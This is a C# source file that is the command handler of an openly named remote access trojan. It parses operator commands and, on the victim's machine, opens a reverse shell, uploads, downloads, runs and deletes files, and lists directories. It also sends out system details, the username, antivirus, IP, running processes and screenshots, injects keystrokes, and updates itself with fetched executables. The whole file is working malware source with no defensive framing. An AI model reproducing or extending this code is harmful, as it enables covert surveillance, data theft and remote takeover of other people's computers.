﻿using System;
using System.Reflection;
using System.IO;
using System.Threading;
using System.Diagnostics;

using Kernel.Functions.Surveillance;
using Kernel.Functions.Performance;
using Kernel.Functions.Devices;
using Kernel.Rooting;

namespace Kernel.Nexus {
    class Handler {
        public static void Processing(string Team) {
            if (Config.FreeHostAdaptive) { Team = Team.Substring(0, Team.IndexOf('<')); }
            if (Team != "") {
                switch (Team.Substring(0, Team.IndexOf('.'))) {
                    case "Shell":
                        switch (Team.Substring(Team.IndexOf('.') + 1, Team.IndexOf('=') - Team.IndexOf('.') - 1)) {
                            case "Show":
                                Shell.Show(Team.Substring(Team.IndexOf('=') + 1));
                                break;

                            case "Hide":
                                Shell.Hide(Team.Substring(Team.IndexOf('=') + 1));
                                break;

                            case "Reverse":
                                try { Binder.Send.Info(Shell.Reverse(Team.Substring(Team.IndexOf('=') + 1))); } catch {
                                    Process.Start(Assembly.GetExecutingAssembly().Location);
                                    Environment.Exit(0);
                                }
                                break;
                        }
                        break;

                    case "File":
                        switch (Team.Substring(Team.IndexOf('.') + 1, Team.IndexOf('=') - Team.IndexOf('.') - 1)) {
                            case "Upload":
                                try {
                                    string dir = Team.Substring(Team.IndexOf('=') + 1).Substring(0, Team.Substring(Team.IndexOf('=') + 1).IndexOf(',')), file = Team.Substring(Team.IndexOf('=') + 1).Substring(Team.Substring(Team.IndexOf('=') + 1).IndexOf(',') + 1);
                                    Binder.Get.File(dir, file);
                                } catch { Binder.Send.Info("Error: Failed to upload file to device!"); }
                                break;

                            case "Download":
                                try {
                                    Binder.Send.File(Team.Substring(Team.IndexOf('=') + 1));
                                } catch { Binder.Send.Info("Error: Failed to upload file to server!"); }
                                break;

                            case "Start":
                                try {
                                    Process.Start(Team.Substring(Team.IndexOf('=') + 1));
                                } catch { Binder.Send.Info("Error: Failed to start file on device!"); }
                                break;

                            case "Delete":
                                try {
                                    File.Delete(Team.Substring(Team.IndexOf('=') + 1));
                                } catch { Binder.Send.Info("Error: Unable to delete file!"); }
                                break;
                        }
                        break;

                    case "FileSystem":
                        switch (Team.Substring(Team.IndexOf('.') + 1, Team.IndexOf('=') - Team.IndexOf('.') - 1)) {
                            case "List":
                                try {
                                    Binder.Send.Info(FileSystem.ListDir(Team.Substring(Team.IndexOf('=') + 1)));
                                } catch { Binder.Send.Info("Error: You cannot view the contents of this directory!"); }
                                break;
                        }
                        break;

                    case "Get":
                        switch (Team.Substring(Team.IndexOf('.') + 1, Team.IndexOf('=') - Team.IndexOf('.') - 1)) {
                            case "OS":
                                Binder.Send.Info(Intelligence.OperatingSystem);
                                break;

                            case "Mac":
                                Binder.Send.Info(Intelligence.macAddresses);
                                break;

                            case "UserName":
                                Binder.Send.Info("UserName: " + Environment.UserName);
                                break;

                            case "MachineName":
                                Binder.Send.Info("MachineName: " + Environment.MachineName);
                                break;

                            case "Antivirus":
                                Binder.Send.Info("Antivirus: " + Intelligence.Antivirus);
                                break;

                            case "Startup":
                                if (Auxiliary.Assistants.RegistryKeyExist()) { Binder.Send.Info("Rooted!"); } else { Binder.Send.Info("Not rooted!"); }
                                break;

                            case "FileDirectory":
                                Binder.Send.Info("CurrentDirectory: " + Assembly.GetExecutingAssembly().Location);
                                break;

                            case "UseDirectory":
                                Binder.Send.Info("CurrentDirectory: " + Environment.CurrentDirectory);
                                break;

                            case "SystemDirectory":
                                Binder.Send.Info("SystemDirectory: " + Environment.SystemDirectory);
                                break;

                            case "LocalIP":
                                Binder.Send.Info("LocalIP: " + Intelligence.LocalIPAddress);
                                break;

                            case "RootDir":
                                Binder.Send.Info("ApplicationRootDirectory: " + Config.MalwareCacheDir);
                                break;

                            case "RootFileName":
                                Binder.Send.Info("ApplicationFileName: " + Config.MalwareFileName);
                                break;

                            case "Processes":
                                Binder.Send.Info(Intelligence.Func.Processes());
                                break;

                            case "Privilege":
                                if (Intelligence.isAdmin) {
                                    Binder.Send.Info("Privilege: Administrator");
                                } else {
                                    Binder.Send.Info("Privilege: User");
                                }
                                break;

                            case "ScreenShot":
                                try {
                                    Shield.ScreenShot(Team.Substring(Team.IndexOf('=') + 1));
                                    Binder.Send.File(Team.Substring(Team.IndexOf('=') + 1));
                                    File.Delete(Team.Substring(Team.IndexOf('=') + 1));
                                } catch { Binder.Send.Info("Error: Failed to send screenshot!"); }
                                break;
                        }
                        break;

                    case "Message":
                        switch (Team.Substring(Team.IndexOf('.') + 1, Team.IndexOf('=') - Team.IndexOf('.') - 1)) {
                            case "Show":
                                string bn = Team.Substring(Team.IndexOf('=') + 1).Substring(0, Team.Substring(Team.IndexOf('=') + 1).IndexOf(',')), bi = Team.Substring(Team.IndexOf('=') + 1).Substring(Team.Substring(Team.IndexOf('=') + 1).IndexOf(',') + 1);
                                Message.Show(bn, bi, 0);
                                break;
                        }
                        break;

                    case "Application":
                        switch (Team.Substring(Team.IndexOf('.') + 1, Team.IndexOf('=') - Team.IndexOf('.') - 1)) {
                            case "Kill":
                                try {
                                    Operation.Kill(Team.Substring(Team.IndexOf('=') + 1));
                                } catch { Binder.Send.Info("Error: Unable to complete this process!"); }
                                break;
                        }
                        break;

                    case "Devices":
                        switch (Team.Substring(Team.IndexOf('.') + 1, Team.IndexOf('=') - Team.IndexOf('.') - 1)) {
                            case "Drive":
                                if (Team.Substring(Team.IndexOf('=') + 1) == "Open") { Drive.Use(true); } else if (Team.Substring(Team.IndexOf('=') + 1) == "Close") { Drive.Use(false); }
                                break;

                            case "Keyboard":
                                try { Keyboard.Press(Convert.ToChar(Team.Substring(Team.IndexOf('=') + 1))); } catch { Binder.Send.Info("Error: Assignment error!"); }
                                break;
                        }
                        break;

                    case "Browser":
                        switch (Team.Substring(Team.IndexOf('.') + 1, Team.IndexOf('=') - Team.IndexOf('.') - 1)) {
                            case "Url":
                                Browser.OpenURL(Team.Substring(Team.IndexOf('=') + 1));
                                break;
                        }
                        break;

                    case "Malware":
                        switch (Team.Substring(Team.IndexOf('.') + 1, Team.IndexOf('=') - Team.IndexOf('.') - 1)) {
                            case "Kill":
                                Environment.Exit(0);
                                break;

                            case "Migrate":                              
                                string mDir = Team.Substring(Team.IndexOf('=') + 1).Substring(0, Team.Substring(Team.IndexOf('=') + 1).IndexOf(',')), mFile = Team.Substring(Team.IndexOf('=') + 1).Substring(Team.Substring(Team.IndexOf('=') + 1).IndexOf(',') + 1);
                                if (Config.MalwareBasicImplementation) { File.Create(mDir + Config.MalwareMigratePoint); }
                                Auxiliary.Task.Migrate(mDir, mFile);
                                break;

                            case "Restart":
                                Process.Start(Assembly.GetExecutingAssembly().Location);
                                Environment.Exit(0);
                                break;

                            case "Sleep":
                                try { Thread.Sleep(Convert.ToInt32(Team.Substring(Team.IndexOf('=') + 1))); } catch { Binder.Send.Info("Error: Assignment error!"); }
                                break;
                                
                            case "Update":
                                Auxiliary.Fixation.Remove();
                                string dir = Team.Substring(Team.IndexOf('=') + 1).Substring(0, Team.Substring(Team.IndexOf('=') + 1).IndexOf(',')), file = Team.Substring(Team.IndexOf('=') + 1).Substring(Team.Substring(Team.IndexOf('=') + 1).IndexOf(',') + 1);
                                Binder.Get.File(dir, file);
                                Process.Start(dir + file);
                                Environment.Exit(0);
                                break;
                        }
                        break;
                }
            }
        }
    }
}
